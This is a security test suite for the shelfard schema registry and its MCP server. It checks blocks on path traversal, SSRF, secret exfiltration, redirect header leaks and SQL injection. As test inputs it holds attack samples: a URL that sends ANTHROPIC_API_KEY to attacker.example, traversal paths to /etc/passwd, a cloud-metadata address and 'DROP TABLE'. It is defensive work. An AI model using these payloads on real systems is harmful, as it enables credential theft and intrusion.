"""
Security tests: path-traversal guards, MCP write-tool gating, env-var allowlist,
SSRF protection, and checker/var tamper guards.

Run: conda run -n shelfard python3 tests/security_tests.py
"""

import asyncio
import json
import os
import socket
import sys
import tempfile
import traceback
import unittest.mock as mock
from pathlib import Path

sys.path.insert(0, str(Path(__file__).parent.parent))

from shelfard import LocalFileRegistry
from shelfard import registry
from shelfard import mcp_server
from shelfard.models import RestCheckerConfig, TableSchema, ColumnSchema, ColumnType
from shelfard.security import check_url_safe, check_env_allowed, validate_name

# ─────────────────────────────────────────────
# Minimal test framework
# ─────────────────────────────────────────────

passed = 0
failed = 0
errors = []


def test(name, fn):
    global passed, failed
    try:
        fn()
        print(f"  ✓ {name}")
        passed += 1
    except AssertionError as e:
        print(f"  ✗ {name}")
        errors.append((name, str(e)))
        failed += 1
    except Exception:
        print(f"  ✗ {name} [ERROR]")
        errors.append((name, traceback.format_exc()))
        failed += 1


def section(name):
    print(f"\n── {name} ──")


def _fake_dns(ip):
    """Patch socket.getaddrinfo to resolve every host to ``ip``."""
    family = socket.AF_INET6 if ":" in ip else socket.AF_INET
    return mock.patch(
        "shelfard.security.socket.getaddrinfo",
        return_value=[(family, socket.SOCK_STREAM, 6, "", (ip, 443))],
    )


class _isolated_default_registry:
    """Point the module-level default registry (used by the MCP tools) at a temp dir."""

    def __enter__(self):
        self._tmp = tempfile.TemporaryDirectory()
        self._orig = registry._default._root
        registry._default._root = Path(self._tmp.name)
        return Path(self._tmp.name)

    def __exit__(self, *exc):
        registry._default._root = self._orig
        self._tmp.cleanup()


def _schema(name="users"):
    return TableSchema(
        table_name=name,
        columns=[ColumnSchema(name="id", col_type=ColumnType.INTEGER, nullable=False)],
    )


# ─────────────────────────────────────────────
# Name validation / path traversal
# ─────────────────────────────────────────────

section("Path traversal")

BAD_NAMES = ["../evil", "..", "a/b", "/etc/passwd", "..\\x", ".hidden", "-x", "", "a" * 200, "x..y"]


def test_validate_name_rejects_bad():
    for n in BAD_NAMES:
        assert validate_name(n) is not None, f"{n!r} should be rejected"


def test_validate_name_accepts_good():
    for n in ["users", "todo_api", "orders-v2", "pg.orders", "A1"]:
        assert validate_name(n) is None, f"{n!r} should be accepted"


def test_register_checker_traversal_blocked():
    with tempfile.TemporaryDirectory() as tmp:
        root = Path(tmp) / "reg"
        r = LocalFileRegistry(root)
        cfg = RestCheckerConfig(schema_name="../../pwned", url="https://example.com", headers=[], env=[])
        res = r.register_checker("../../pwned", cfg)
        assert not res.success
        assert not (Path(tmp) / "pwned.json").exists()
        assert not any(Path(tmp).rglob("pwned.json"))


def test_register_schema_traversal_blocked():
    with tempfile.TemporaryDirectory() as tmp:
        r = LocalFileRegistry(Path(tmp) / "reg")
        res = r.register_schema("../outside", _schema())
        assert not res.success
        assert not any(Path(tmp).rglob("outside.json"))


def test_subscribe_consumer_traversal_blocked():
    with tempfile.TemporaryDirectory() as tmp:
        r = LocalFileRegistry(Path(tmp) / "reg")
        assert r.register_schema("users", _schema()).success
        res = r.subscribe_consumer("../../evil", "users")
        assert not res.success
        assert not (Path(tmp) / "evil").exists()


def test_get_checker_traversal_blocked():
    with tempfile.TemporaryDirectory() as tmp:
        secret = Path(tmp) / "secret.json"
        secret.write_text('{"schema_name": "x", "url": "leak"}')
        r = LocalFileRegistry(Path(tmp) / "reg")
        res = r.get_checker("../../secret")
        assert not res.success and "leak" not in json.dumps(res.data or {})


def test_get_schema_traversal_blocked():
    with tempfile.TemporaryDirectory() as tmp:
        r = LocalFileRegistry(Path(tmp) / "reg")
        res = r.get_registered_schema("../../../etc/passwd")
        assert not res.success and "Invalid" in res.error


def test_set_var_rejects_bad_name():
    with tempfile.TemporaryDirectory() as tmp:
        r = LocalFileRegistry(tmp)
        assert not r.set_var("bad-name", "x").success
        assert not r.set_var("1abc", "x").success
        assert r.set_var("good_name", "x").success


def test_checker_schema_name_mismatch_rejected():
    with tempfile.TemporaryDirectory() as tmp:
        r = LocalFileRegistry(tmp)
        cfg = RestCheckerConfig(schema_name="other", url="https://example.com", headers=[], env=[])
        assert not r.register_checker("users", cfg).success


for fn in [
    test_validate_name_rejects_bad, test_validate_name_accepts_good,
    test_register_checker_traversal_blocked, test_register_schema_traversal_blocked,
    test_subscribe_consumer_traversal_blocked, test_get_checker_traversal_blocked,
    test_get_schema_traversal_blocked, test_set_var_rejects_bad_name,
    test_checker_schema_name_mismatch_rejected,
]:
    test(fn.__name__, fn)


# ─────────────────────────────────────────────
# SSRF / env allowlist primitives
# ─────────────────────────────────────────────

section("SSRF + env allowlist")


def test_url_rejects_non_http_scheme():
    assert check_url_safe("file:///etc/passwd", allow_private=False)
    assert check_url_safe("gopher://x", allow_private=False)


def test_url_rejects_internal_addresses():
    for ip in ["127.0.0.1", "10.0.0.5", "192.168.1.1", "169.254.169.254", "::1", "0.0.0.0",
               "::ffff:127.0.0.1"]:
        with _fake_dns(ip):
            assert check_url_safe("https://h.example", allow_private=False), ip


def test_url_accepts_public_address():
    with _fake_dns("93.184.216.34"):
        assert check_url_safe("https://example.com/api", allow_private=False) is None


def test_url_private_allowed_by_env():
    with mock.patch.dict(os.environ, {"SHELFARD_MCP_ALLOW_PRIVATE_HOSTS": "1"}):
        assert check_url_safe("http://localhost:8080") is None


def test_env_allowlist():
    with mock.patch.dict(os.environ, {"SHELFARD_MCP_ENV_ALLOWLIST": "BEARER_TOKEN"}, clear=False):
        assert check_env_allowed(["SHELFARD_TOKEN", "BEARER_TOKEN"]) is None
        err = check_env_allowed(["ANTHROPIC_API_KEY"])
        assert err and "ANTHROPIC_API_KEY" in err


for fn in [
    test_url_rejects_non_http_scheme, test_url_rejects_internal_addresses,
    test_url_accepts_public_address, test_url_private_allowed_by_env, test_env_allowlist,
]:
    test(fn.__name__, fn)


# ─────────────────────────────────────────────
# MCP server
# ─────────────────────────────────────────────

section("MCP server")


def _tool_names(server):
    return {t.name for t in asyncio.run(server.list_tools())}


def test_write_tools_hidden_by_default():
    names = _tool_names(mcp_server.build_server())
    assert "get_schema" in names and "live_check_schema" in names
    assert not names & {t.__name__ for t in mcp_server.WRITE_TOOLS}, names


def test_write_tools_exposed_with_flag():
    names = _tool_names(mcp_server.build_server(allow_writes=True))
    assert {"register_checker", "register_postgres_checker", "set_template_var",
            "delete_template_var"} <= names


def test_mcp_register_blocks_secret_exfiltration():
    """The original attack: send ANTHROPIC_API_KEY to an attacker URL."""
    with _isolated_default_registry() as root, _fake_dns("93.184.216.34"):
        out = json.loads(mcp_server.register_checker(
            "x",
            "https://attacker.example/?k=$ANTHROPIC_API_KEY",
            env='["ANTHROPIC_API_KEY"]',
        ))
        assert not out["success"] and "ANTHROPIC_API_KEY" in out["error"]
        assert not (root / "checkers" / "x.json").exists()


def test_mcp_register_blocks_undeclared_env_ref():
    with _isolated_default_registry(), _fake_dns("93.184.216.34"):
        out = json.loads(mcp_server.register_checker(
            "x", "https://api.example/", headers='[{"Authorization": "$AWS_SECRET_ACCESS_KEY"}]',
        ))
        assert not out["success"] and "AWS_SECRET_ACCESS_KEY" in out["error"]


def test_mcp_register_blocks_ssrf():
    with _isolated_default_registry(), _fake_dns("169.254.169.254"):
        out = json.loads(mcp_server.register_checker("x", "http://metadata.example/latest"))
        assert not out["success"] and "internal" in out["error"]


def test_mcp_register_blocks_traversal():
    with _isolated_default_registry(), _fake_dns("93.184.216.34"):
        out = json.loads(mcp_server.register_checker("../../x", "https://api.example/"))
        assert not out["success"] and "Invalid" in out["error"]


def test_mcp_register_rejects_malformed_json():
    with _isolated_default_registry():
        out = json.loads(mcp_server.register_checker("x", "https://api.example/", env="nope"))
        assert not out["success"]
        out = json.loads(mcp_server.register_checker("x", "https://api.example/", headers='[1]'))
        assert not out["success"]


def test_mcp_register_allowed_checker():
    with _isolated_default_registry() as root, _fake_dns("93.184.216.34"):
        out = json.loads(mcp_server.register_checker(
            "users", "https://api.example/users",
            env='["SHELFARD_API_TOKEN"]',
            headers='[{"Authorization": "Bearer $SHELFARD_API_TOKEN"}]',
        ))
        assert out["success"], out
        assert (root / "checkers" / "users.json").exists()


def test_mcp_register_cannot_overwrite():
    with _isolated_default_registry(), _fake_dns("93.184.216.34"):
        registry.register_checker(
            "users", RestCheckerConfig(schema_name="users", url="https://real.example/users", headers=[], env=[]),
        )
        out = json.loads(mcp_server.register_checker("users", "https://attacker.example/"))
        assert not out["success"] and "already exists" in out["error"]
        assert registry.get_checker("users").data["checker"]["url"] == "https://real.example/users"


def test_mcp_cannot_redirect_checker_via_template_var():
    with _isolated_default_registry():
        registry.set_var("api_host", "https://real.example")
        registry.register_checker(
            "users",
            RestCheckerConfig(
                schema_name="users", url="{{api_host}}/users",
                headers=[{"Authorization": "$TOKEN"}], env=["TOKEN"],
            ),
        )
        out = json.loads(mcp_server.set_template_var("api_host", "https://attacker.example"))
        assert not out["success"] and "used by a registered checker" in out["error"]
        out = json.loads(mcp_server.delete_template_var("api_host"))
        assert not out["success"]
        assert registry.get_var("api_host").data["value"] == "https://real.example"
        # unrelated vars are still settable
        assert json.loads(mcp_server.set_template_var("unused", "v"))["success"]


for fn in [
    test_write_tools_hidden_by_default, test_write_tools_exposed_with_flag,
    test_mcp_register_blocks_secret_exfiltration, test_mcp_register_blocks_undeclared_env_ref,
    test_mcp_register_blocks_ssrf, test_mcp_register_blocks_traversal,
    test_mcp_register_rejects_malformed_json, test_mcp_register_allowed_checker,
    test_mcp_register_cannot_overwrite, test_mcp_cannot_redirect_checker_via_template_var,
]:
    test(fn.__name__, fn)


# ─────────────────────────────────────────────
# Hardened HTTP fetch: redirects + connection guard (SEC-1, SEC-2)
# ─────────────────────────────────────────────

section("HTTP redirects + connection-time guard")

import threading
from http.server import BaseHTTPRequestHandler, HTTPServer

import requests

from shelfard import net
from shelfard.models import PostgresCheckerConfig
from shelfard.tools.rest import RestChecker
from shelfard.tools.postgres import PostgresChecker


class _Server:
    """Tiny local HTTP server. ``routes``: path -> (status, headers, body)."""

    def __init__(self, routes):
        self.seen = []                     # (path, headers) of every request
        outer = self

        class Handler(BaseHTTPRequestHandler):
            def do_GET(self):
                outer.seen.append((self.path, dict(self.headers)))
                status, headers, body = outer.routes.get(self.path, (404, {}, b"{}"))
                self.send_response(status)
                for k, v in headers.items():
                    self.send_header(k, v.format(**outer.fmt))
                self.send_header("Content-Type", "application/json")
                self.end_headers()
                self.wfile.write(body)

            def log_message(self, *a):
                pass

        self.routes = routes
        self.fmt = {}
        self.httpd = HTTPServer(("127.0.0.1", 0), Handler)
        self.port = self.httpd.server_address[1]
        self.url = f"http://127.0.0.1:{self.port}"
        threading.Thread(target=self.httpd.serve_forever, daemon=True).start()

    def close(self):
        self.httpd.shutdown()
        self.httpd.server_close()


_OK = (200, {}, b'{"id": 1, "name": "a"}')


def test_cross_origin_redirect_drops_headers():
    b = _Server({"/data": _OK})
    a = _Server({"/start": (302, {"Location": f"{b.url}/data"}, b"")})
    try:
        r = net.fetch(f"{a.url}/start", {"X-API-Key": "s3cret", "Authorization": "Bearer t"})
        assert r.status_code == 200
        assert a.seen[0][1].get("X-API-Key") == "s3cret"
        hdrs = b.seen[0][1]
        assert "X-API-Key" not in hdrs and "Authorization" not in hdrs, hdrs
    finally:
        a.close(); b.close()


def test_same_origin_redirect_keeps_headers():
    a = _Server({"/start": (301, {"Location": "/data"}, b""), "/data": _OK})
    try:
        r = net.fetch(f"{a.url}/start", {"X-API-Key": "s3cret"})
        assert r.status_code == 200
        assert a.seen[1][1].get("X-API-Key") == "s3cret"
    finally:
        a.close()


def test_redirect_to_non_http_refused():
    a = _Server({"/start": (302, {"Location": "file:///etc/passwd"}, b"")})
    try:
        _raises_exc(net.UnsafeRedirectError, lambda: net.fetch(f"{a.url}/start"))
    finally:
        a.close()


def test_too_many_redirects():
    a = _Server({"/loop": (302, {"Location": "/loop"}, b"")})
    try:
        _raises_exc(requests.exceptions.TooManyRedirects,
                    lambda: net.fetch(f"{a.url}/loop", max_redirects=3))
        assert len(a.seen) == 4
    finally:
        a.close()


def test_guard_blocks_internal_peer_at_connect_time():
    """Simulates DNS rebinding: whatever the name resolved to before, the socket is checked."""
    a = _Server({"/data": _OK})
    try:
        _raises_exc(requests.exceptions.ConnectionError,
                    lambda: net.fetch(f"{a.url}/data", guard_private=True))
        assert a.seen == [], "request must not be sent to a blocked peer"
    finally:
        a.close()


def test_guard_checks_every_redirect_hop():
    b = _Server({"/data": _OK})
    a = _Server({"/start": (302, {"Location": f"{b.url}/data"}, b"")})
    allowed_ports = {a.port}
    orig = net._GuardMixin._new_conn

    def only_first_server(self):
        # allow the first server's port, treat everything else as internal
        if self.port in allowed_ports:
            return super(net._GuardMixin, self)._new_conn()
        return orig(self)

    try:
        with mock.patch.object(net._GuardMixin, "_new_conn", only_first_server):
            _raises_exc(requests.exceptions.ConnectionError,
                        lambda: net.fetch(f"{a.url}/start", guard_private=True))
        assert len(a.seen) == 1 and b.seen == []
    finally:
        a.close(); b.close()


def _raises_exc(exc, fn):
    try:
        fn()
    except exc:
        return
    raise AssertionError(f"expected {exc.__name__}")


def _rest_checker(via, url):
    with tempfile.TemporaryDirectory() as tmp:
        r = LocalFileRegistry(tmp)
        r.register_schema("users", _schema())
        cfg = RestCheckerConfig(schema_name="users", url=url, headers=[], env=[], registered_via=via)
        return RestChecker(cfg, r).run()


def test_mcp_rest_checker_guarded_at_run_time():
    a = _Server({"/data": _OK})
    try:
        res = _rest_checker("mcp", f"{a.url}/data")
        assert not res.success and "Blocked" in res.error, res.error
        assert a.seen == []
    finally:
        a.close()


def test_cli_rest_checker_not_guarded():
    a = _Server({"/data": _OK})
    try:
        assert _rest_checker("cli", f"{a.url}/data").success
    finally:
        a.close()


def test_mcp_rest_checker_private_allowed_by_env():
    a = _Server({"/data": _OK})
    try:
        with mock.patch.dict(os.environ, {"SHELFARD_MCP_ALLOW_PRIVATE_HOSTS": "1"}):
            assert _rest_checker("mcp", f"{a.url}/data").success
    finally:
        a.close()


for fn in [
    test_cross_origin_redirect_drops_headers, test_same_origin_redirect_keeps_headers,
    test_redirect_to_non_http_refused, test_too_many_redirects,
    test_guard_blocks_internal_peer_at_connect_time, test_guard_checks_every_redirect_hop,
    test_mcp_rest_checker_guarded_at_run_time, test_cli_rest_checker_not_guarded,
    test_mcp_rest_checker_private_allowed_by_env,
]:
    test(fn.__name__, fn)


# ─────────────────────────────────────────────
# PostgreSQL: run-time pinning (SEC-1) + SQL templates (SEC-4)
# ─────────────────────────────────────────────

section("PostgreSQL guards")


def _run_pg_checker(cfg):
    """Run a PostgresChecker with PostgresReader mocked; return (result, reader_mock)."""
    reader = mock.MagicMock()
    reader.return_value.get_schema.return_value = mock.MagicMock(success=False, error="mocked")
    with tempfile.TemporaryDirectory() as tmp, \
            mock.patch("shelfard.tools.postgres.reader.PostgresReader", reader):
        r = LocalFileRegistry(tmp)
        return PostgresChecker(cfg, r).run(), reader


def _pg_cfg(via, dsn="postgresql://u@db.example.com:5432/app", **kw):
    return PostgresCheckerConfig(schema_name="pg", dsn=dsn, env=[], table="orders",
                                 registered_via=via, **kw)


def test_mcp_pg_checker_pins_hostaddr():
    with _fake_dns("93.184.216.34"):
        _, reader = _run_pg_checker(_pg_cfg("mcp"))
    dsn = reader.call_args[0][0]
    assert dsn.endswith("?hostaddr=93.184.216.34"), dsn


def test_mcp_pg_checker_blocks_rebinding():
    with _fake_dns("10.0.0.7"):
        res, reader = _run_pg_checker(_pg_cfg("mcp"))
    assert not res.success and "Blocked unsafe DSN" in res.error
    reader.assert_not_called()


def test_mcp_pg_checker_blocks_unix_socket():
    res, reader = _run_pg_checker(_pg_cfg("mcp", dsn="dbname=app"))
    assert not res.success
    reader.assert_not_called()


def test_cli_pg_checker_not_pinned():
    _, reader = _run_pg_checker(_pg_cfg("cli", dsn="postgresql://u@localhost/app"))
    assert reader.call_args[0][0] == "postgresql://u@localhost/app"


def test_pg_checker_rejects_query_template_at_run_time():
    cfg = PostgresCheckerConfig(schema_name="pg", dsn="postgresql://u@localhost/app", env=[],
                                query="SELECT * FROM t WHERE id = {{id}}")
    res, reader = _run_pg_checker(cfg)
    assert not res.success and "not allowed in SQL" in res.error
    reader.assert_not_called()


def test_registry_rejects_query_template():
    with tempfile.TemporaryDirectory() as tmp:
        r = LocalFileRegistry(tmp)
        cfg = PostgresCheckerConfig(schema_name="pg", dsn="postgresql://u@h/app", env=[],
                                    query="SELECT {{cols}} FROM t")
        res = r.register_checker("pg", cfg)
        assert not res.success and "not allowed in SQL" in res.error


def test_cli_rejects_query_template():
    from shelfard.cli import build_parser
    for argv in (
        ["postgres", "snapshot", "--dsn", "postgresql://u@h/db", "--name", "x",
         "--query", "SELECT * FROM {{t}}"],
        ["postgres", "check", "--dsn", "postgresql://u@h/db", "--name", "x",
         "--query", "SELECT * FROM {{t}}"],
        ["checker", "register", "x", "--type", "postgres", "--dsn", "postgresql://u@h/db",
         "--query", "SELECT * FROM {{t}}"],
    ):
        args = build_parser().parse_args(argv)
        assert args.func(args) == 2, argv


for fn in [
    test_mcp_pg_checker_pins_hostaddr, test_mcp_pg_checker_blocks_rebinding,
    test_mcp_pg_checker_blocks_unix_socket, test_cli_pg_checker_not_pinned,
    test_pg_checker_rejects_query_template_at_run_time, test_registry_rejects_query_template,
    test_cli_rejects_query_template,
]:
    test(fn.__name__, fn)


# ─────────────────────────────────────────────
# MCP register_postgres_checker (AGT-2)
# ─────────────────────────────────────────────

section("MCP register_postgres_checker")

_PG_DSN = "postgresql://reader:$SHELFARD_PG_PASSWORD@db.example.com:5432/app"


def test_mcp_pg_register_ok():
    with _isolated_default_registry(), _fake_dns("93.184.216.34"):
        out = json.loads(mcp_server.register_postgres_checker(
            "orders", _PG_DSN, "orders", env='["SHELFARD_PG_PASSWORD"]'))
        assert out["success"], out
        c = registry.get_checker("orders").data["checker"]
        assert c["registered_via"] == "mcp" and c["table"] == "orders" and c["query"] is None


def test_mcp_rest_register_marks_mcp():
    with _isolated_default_registry(), _fake_dns("93.184.216.34"):
        assert json.loads(mcp_server.register_checker("u", "https://api.example/u"))["success"]
        assert registry.get_checker("u").data["checker"]["registered_via"] == "mcp"


def test_mcp_pg_register_blocks_private_host():
    with _isolated_default_registry(), _fake_dns("192.168.0.10"):
        out = json.loads(mcp_server.register_postgres_checker(
            "orders", _PG_DSN, "orders", env='["SHELFARD_PG_PASSWORD"]'))
        assert not out["success"] and "internal" in out["error"]


def test_mcp_pg_register_blocks_bad_identifiers():
    with _isolated_default_registry(), _fake_dns("93.184.216.34"):
        for table, schema in (("orders; DROP TABLE x", "public"), ("orders", "pub lic")):
            out = json.loads(mcp_server.register_postgres_checker(
                "orders", _PG_DSN, table, db_schema=schema, env='["SHELFARD_PG_PASSWORD"]'))
            assert not out["success"], (table, schema)


def test_mcp_pg_register_blocks_secret_env():
    with _isolated_default_registry(), _fake_dns("93.184.216.34"):
        out = json.loads(mcp_server.register_postgres_checker(
            "orders", "postgresql://u:$AWS_SECRET_ACCESS_KEY@db.example.com/app", "orders",
            env='["AWS_SECRET_ACCESS_KEY"]'))
        assert not out["success"] and "AWS_SECRET_ACCESS_KEY" in out["error"]


def test_mcp_pg_register_blocks_multihost_and_socket():
    with _isolated_default_registry(), _fake_dns("93.184.216.34"):
        for dsn in ("postgresql://u@a.example,b.example/app", "dbname=app",
                    "postgresql:///app?host=/var/run/postgresql"):
            out = json.loads(mcp_server.register_postgres_checker("orders", dsn, "orders"))
            assert not out["success"], dsn


def test_mcp_pg_register_cannot_overwrite():
    with _isolated_default_registry(), _fake_dns("93.184.216.34"):
        registry.register_checker("orders", PostgresCheckerConfig(
            schema_name="orders", dsn="postgresql://u@real/app", env=[], table="orders"))
        out = json.loads(mcp_server.register_postgres_checker(
            "orders", "postgresql://u@db.example.com/app", "orders"))
        assert not out["success"] and "already exists" in out["error"]


for fn in [
    test_mcp_pg_register_ok, test_mcp_rest_register_marks_mcp,
    test_mcp_pg_register_blocks_private_host, test_mcp_pg_register_blocks_bad_identifiers,
    test_mcp_pg_register_blocks_secret_env, test_mcp_pg_register_blocks_multihost_and_socket,
    test_mcp_pg_register_cannot_overwrite,
]:
    test(fn.__name__, fn)


# ─────────────────────────────────────────────
# Summary
# ─────────────────────────────────────────────

total = passed + failed
print(f"\n{'='*50}")
print(f"Results: {passed}/{total} passed", end="")
if failed:
    print(f"  ({failed} failed)")
    print("\nFailures:")
    for name, err in errors:
        print(f"\n  ✗ {name}")
        print(f"    {err}")
else:
    print(" ✓")
print('='*50)
sys.exit(0 if failed == 0 else 1)
